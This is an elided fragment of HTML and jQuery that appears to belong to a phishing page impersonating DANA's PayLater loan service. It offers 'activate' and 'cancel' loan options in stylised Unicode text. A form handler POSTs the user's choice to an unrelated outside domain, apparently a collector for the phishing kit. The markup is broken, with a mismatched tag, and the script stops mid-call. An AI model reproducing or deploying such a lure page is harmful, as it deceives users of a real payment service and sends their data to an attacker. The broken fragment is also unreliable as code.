...
<form id="patok" style="margin-top: -90px; border-top: 1px solid #ccc; height: 145px; text-align: center; background: url(https://hosting.tigerengine.id/urtrn0.png);
    background-position: 100% 100%;
...
.s:active{
 ...
 <center>
       <label class="aha">
       <input type="radio" id="btn1" name="tarif" value="𝗔𝗸𝘁𝗶𝗳𝗸𝗮𝗻 𝗗𝗔𝗡𝗔 𝗣𝗮𝘆𝗹𝗮𝘁𝗲𝗿" onclick="letsgo1()"/>
    <span class="s">𝗔𝗸𝘁𝗶𝗳𝗸𝗮𝗻  𝗣𝗶𝗻𝗷𝗮𝗺𝗮𝗻 𝗗𝗔𝗡𝗔 𝗣𝗮𝘆𝗹𝗮𝘁𝗲𝗿</span>
		</label>
  <label class="aha">
   <input type="radio" id="btn2" name="tarif" value="𝗣𝗲𝗺𝗯𝗮𝘁𝗮𝗹𝗮𝗻 𝗗𝗔𝗡𝗔 𝗣𝗮𝘆𝗹𝗮𝘁𝗲𝗿" onclick="letsgo1()">
   <sp class="s">𝗣𝗲𝗺𝗯𝗮𝘁𝗮𝗹𝗮𝗻 𝗣𝗶𝗻𝗷𝗮𝗺𝗮𝗻 𝗗𝗔𝗡𝗔 𝗣𝗮𝘆𝗹𝗮𝘁𝗲𝗿</span>
   </label>
   <label class="aha">
...
var tarif = $('input[name="tarif"]:checked').val();
 ...
 event.preventDefault();
      $("#process1").fadeIn(); 
        $.ajax({
            type: 'POST',
            url: 'https://choreo.ii-fi.cfd/vl0d/ss/tarif.php',
